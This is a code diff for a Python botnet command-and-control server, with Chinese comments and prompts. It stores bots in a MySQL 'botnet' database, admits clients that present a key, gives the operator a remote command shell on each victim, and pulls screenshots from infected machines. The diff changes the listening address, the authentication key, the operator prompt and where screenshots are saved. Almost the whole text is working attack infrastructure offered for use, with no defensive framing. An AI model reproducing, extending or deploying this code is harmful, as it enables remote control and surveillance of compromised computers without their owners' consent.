@@ -1,12 +1,12 @@
+import os
 import sys
 from socket import *
 from threading import Thread
 import MySQLdb
 import time
 
-# ip = "192.168.1.10"
-# port = 444
-
+ip = "192.168.10.1"
+port = 80
 client_list = []
 client_addr_list = []
 client_username_list = []
@@ -15,10 +15,6 @@ client_username_list = []
 def data_list():
     return client_list, client_addr_list, client_username_list
 
-
-##############################################
-#              数据库操作                      #
-##############################################
 
 def connect_mysql():
     db = MySQLdb.connect(host="localhost", user="root", password="123456", database="botnet", charset='utf8')
@@ -81,27 +77,27 @@ def get_mysql():
     return results
 
 
-##############################################
-#              监听服务器                      #
-##############################################
-
 def connect():
     mysql_ip_list = []
     s = socket(AF_INET, SOCK_STREAM)
+    # print("ip, port: ", ip, port)
     s.bind((ip, int(port)))
     while True:
         s.listen(100)
         print("[*]服务器监听中")
         c, addr = s.accept()
+        # print("c, addr:", c, addr)
         key_username = c.recv(2048).decode('utf-8')
-        print("key_username", key_username)
-        if key_username.split(" ")[0] == "admin":
+        # print("key_username:", key_username)
+        if key_username.split(" ")[0] == "freet":
             username = key_username.split(" ")[1]
+            # 保存客户端信息
             client_list.append(c)
             client_addr_list.append(addr)
             client_username_list.append(username)
             print("[*]提示:" + username + ' ' + addr[0] + ":" + str(addr[1]) + "上线")
             mysql_client_list = get_mysql()
+            # print("mysql_client_list:", mysql_client_list)
             for i in mysql_client_list:
                 mysql_ip = i[1]
                 mysql_ip_list.append(mysql_ip)
@@ -111,7 +107,6 @@ def connect():
                 insert_mysql()
 
 
-# 获取
 def client_shell(client, addr):
     while True:
         user_cmd = input(f'[{addr}]>>')
@@ -119,8 +114,9 @@ def client_shell(client, addr):
             client.send(user_cmd.encode('utf-8'))
             break
         elif user_cmd == 'screen shoot':
+            file_path = os.getcwd()
             client.send('screen shoot'.encode('utf-8'))
-            file = open(f"{addr}.jpg", 'wb')
+            file = open(f"{file_path}\\static\\screen\\{addr}.png", 'wb')
             print("[*]正在接受图片,请等待！")
             while True:
                 # 指定最大接收量
@@ -157,7 +153,7 @@ def server_shell(a_cmd):
                 del client_addr_list[b]
     else:
         while True:
-            cmd = input('freet(qiuyu)>')
+            cmd = input('blaze(lif314)>')
             if cmd == "exploit":
                 t = Thread(target=connect)
                 t.setDaemon(True)
